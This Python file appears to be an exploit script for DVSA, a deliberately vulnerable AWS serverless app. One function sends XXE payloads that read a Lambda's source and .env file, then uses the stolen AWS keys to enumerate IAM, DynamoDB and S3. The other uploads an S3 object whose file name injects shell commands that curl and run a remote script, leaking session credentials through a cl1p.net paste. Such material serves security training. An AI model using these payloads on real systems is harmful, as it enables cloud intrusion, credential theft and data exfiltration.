# -*- coding: utf-8 -*-
# /bin/python

# region imports
import json
import base64
import os
import time
import boto3
from botocore.config import Config
import random
import string
import time
import sys
import utils as utils
import logger as logger
# endregion


def xploit_xxe():
    xxe_ok_request = '<?xml version="1.0"?><movie>Harry Potter</movie>'
    xxe_steal_source = '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY test SYSTEM "/var/task/handler.py">]><movie>&test;</movie>'
    xxe_steal_env = '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY test SYSTEM ".env">]><movie>&test;</movie>'
    xxe_endpoint_err = "Could not find movies with:"
    aws_output_file = utils.LOCAL_FOLDER + ".awsoutput"
    aws_cli_err = "An error occurred (AccessDenied) when calling the ListUsers operation: User: movies-db-user is not authorized to perform: {}:{}"

    profile = utils.getProfile()
    if "endpoint" in profile and profile["endpoint"] is not None:
        endpoint = profile["endpoint"]
    else:
        endpoint = logger.input("Please insert the XXE-vulnerable Lambda's endpoint > ")
        profile["endpoint"] = endpoint
        utils.updateProfile(profile)
        with open(utils.LOCAL_FOLDER + ".endpoint", "w+") as f:
            f.write(endpoint)

    logger.info("Using endpoint: " + endpoint)
    header = {'content-type': 'application/xml'}
    response = utils.ApiCall(endpoint, "POST", xxe_ok_request, header)
    try:
        res = json.loads(response)
    except:
        res = response

    if "status" in res and res["status"] == "ok":
        logger.alert("Got answer from endpoint. Trying exploits...")
        logger.info("[!] Trying to steal source code")
        data = xxe_steal_source
        response = utils.ApiCall(endpoint, "POST", data, header)
        try:
            res = json.loads(response)
        except:
            res = response

        if "status" in res and res["status"] == "err" and "result" in res and res["result"].find(xxe_endpoint_err) > -1 and res["result"].find("import") > -1:
            logger.alert("Lambda source code obtained! Parsing code...")
            for i in range(0, 5):
                sys.stdout.write(".")
                time.sleep(0.5)
                sys.stdout.flush()
            logger.info(". [!] Additional file(s) identified. Trying to steal.")
            data= xxe_steal_env
            response = utils.ApiCall(endpoint, "POST", data, header)
            try:
                res = json.loads(response)
            except:
                res = response
            if "status" in res and res["status"] == "err" and "result" in res and res["result"].find(xxe_endpoint_err) > -1 and res["result"].find("aws_access_key_id") > -1:
                logger.pwned()
                raw_keys = res["result"].replace(xxe_endpoint_err, "").rstrip()
                keys = json.loads(raw_keys)
                logger.alert("[!] AWS keys obtained! Trying to access other resources...")
                os.environ["AWS_ACCESS_KEY_ID"] = keys['aws_access_key_id']
                os.environ["AWS_SECRET_ACCESS_KEY"] = keys["aws_secret_access_key"]

                logger.info("[X] Trying IAM")
                service = "iam"
                action = "list-roles"
                cmd = ""
                utils.run_aws_cmd(service, action, cmd)

                logger.info("[X] Trying DynamoDB")
                service = "dynamodb"
                action = "list-tables"
                cmd = ""
                utils.run_aws_cmd(service, action, cmd)

                logger.info("[X] Trying S3")
                service = "s3"
                action = "ls"
                cmd = ""
                utils.run_aws_cmd(service, action, cmd)
                if os.path.isfile(aws_output_file) and not os.stat(aws_output_file).st_size == 0:
                    with open(aws_output_file, "r") as f:
                        output = f.readlines()
                        list_buckets = []
                    for line in output:
                        logger.alert(line.rstrip())
                        list_buckets.append(line[20:].rstrip())

                logger.info("[X] Trying to access buckets(s)")
                service = "s3api"
                action = "list-objects-v2"
                for bucket in list_buckets:
                    cmd = "--bucket {}".format(bucket)
                    utils.run_aws_cmd(service, action, cmd)
                    if os.path.isfile(aws_output_file) and not os.stat(aws_output_file).st_size == 0:
                        with open(aws_output_file, "r") as f:
                            logger.info(f.read())
                raw_input()
        else:
            logger.error("XXE exploit did not work!")
    else:
        logger.error("Invalid response. Please check endpoint and try again.")

    raw_input()
    return


def xploit_injection():
    profile = utils.getProfile()
    aws_output_file = utils.LOCAL_FOLDER + ".awsoutput"
    if "account" in profile and profile["account"] is not None:
        account = profile["account"]
    else:
        account = logger.input("Please insert the AWS Account ID on which DVSA is installed > ")
        profile["account"] = account
        utils.updateProfile(profile)
        with open(utils.LOCAL_FOLDER + ".account", "w+") as f:
            f.write(account)

    logger.debug("generating random url")
    rand = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    url = "https://cl1p.net/dvsa-s3-attack-" + str(rand)
    logger.debug(url)
    logger.debug("getting page hash")
    pageHash = utils.ApiCall(url, "GET", None, None)
    if pageHash.find("pageHash") == -1:
        pageHash = utils.ApiCall(url, "GET", None, None)

    pgh = pageHash.split("pageHash")[1][9:73]
    sqh = pageHash.split("seqHash")[1][9:73]
    logger.debug(pgh)
    logger.debug(sqh)
    logger.info("creating malicious files name")
    fname = "_;cd ..;cd ..;cd tmp;echo {}>r;echo {}>p;echo {}>s;curl xza.s3-website-us-east-1.amazonaws.com>x;sh x;ls x.raw".format(rand, pgh, sqh)
    logger.debug(fname)
    logger.info("uploading malicious file to s3 bucket")

    bucket = "dvsa-receipts-bucket-{}".format(account)
    if profile["proxy"] is not None:
        proxy = {'http': profile["proxy"], 'https': profile["proxy"]}
    else:
        proxy = {}

    s3 = boto3.client('s3', config=Config(proxies=proxy), verify=False)

    s3.upload_file('/dev/null', bucket, '2020/20/20/{}'.format(fname), ExtraArgs={'ACL': 'public-read'})

    logger.info("Malicious file was uploaded successfully.")
    logger.debug("Uploaded to bucket: " + bucket + ", path: 2020/20/20/")
    logger.info("Waiting for remote account to execute the malicious payload ")
    for i in range(5):
        sys.stdout.write('.')
        sys.stdout.flush()
        time.sleep(1)
    print("\n")

    logger.info("fetching keys from: {}  (link will no longer be accessible)".format(url))
    res = utils.ApiCall(url, "GET", None, None)
    locs = res.find('<textarea name="content">')
    if locs == -1:
        logger.error("something went wrong.")
        sys.exit(3)
    else:
        loce = res.find('</textarea>')
        content = res[locs + 25:loce]

    rawkeys = base64.b64decode(content)
    logger.pwned()
    logger.alert(rawkeys)
    if rawkeys.find("AWS_SESSION_TOKEN") != -1 and rawkeys.find("AWS_ACCESS_KEY_ID") != -1:
        for line in rawkeys.split('\n'):
            if line.upper().startswith("AWS_SESSION_TOKEN="):
                os.environ["AWS_SESSION_TOKEN"] = line[18:].rstrip()
            elif line.upper().startswith("AWS_ACCESS_KEY_ID="):
                os.environ["AWS_ACCESS_KEY_ID"] = line[18:].rstrip()
            elif line.upper().startswith("AWS_SECRET_ACCESS_KEY="):
                os.environ["AWS_SECRET_ACCESS_KEY"] = line[22:].rstrip()
            else:
                pass

        logger.pwned()
        logger.alert("Got remote lambda keys! Trying access to other resource...")

        logger.info("[X] Who am I? (caller-identity)")
        service = "sts"
        action = "get-caller-identity"
        cmd = ""
        utils.run_aws_cmd(service, action, cmd)
        if os.path.isfile(aws_output_file) and not os.stat(aws_output_file).st_size == 0:
            with open(aws_output_file, "r") as f:
                output = f.readlines()
            logger.info(''.join(output))

        for line in output:
            if line.find("Arn") > -1:
                rolename = line.rstrip().replace("|", "").split("/")[1]

        logger.info("[X] Trying IAM")
        service = "iam"
        action = "get-role"
        cmd = "--role-name {}".format(rolename)
        utils.run_aws_cmd(service, action, cmd)

        logger.info("[X] Trying DynamoDB")
        service = "dynamodb"
        action = "list-tables"
        cmd = ""
        utils.run_aws_cmd(service, action, cmd)
        if os.path.isfile(aws_output_file) and not os.stat(aws_output_file).st_size == 0:
            with open(aws_output_file, "r") as f:
                output = f.readlines()
            logger.info(''.join(output))

        logger.info("[X] Trying to access table(s)")
        tables_list = []
        for line in output:
            line = line.replace("|", "").replace("+", "").replace(" ListTables ", "").replace(" TableNames ", "").replace(" ", "").rstrip()
            if len(line) > 3 and line.find("----") == -1:
                tables_list.append(line)
        action = "scan"
        for table in tables_list:
            if table.startswith("DVSA"):
                cmd = "--table {}".format(table)
                utils.run_aws_cmd(service, action, cmd, "text")
                if os.path.isfile(aws_output_file) and not os.stat(aws_output_file).st_size == 0:
                    with open(aws_output_file, "r") as f:
                        logger.info(f.read())

        raw_input()
        return True
    else:
        logger.error("Sorry, could not obtain keys.")
        logger.pressAnyKey()
        raw_input()
        return False
    # endregion


# endregion
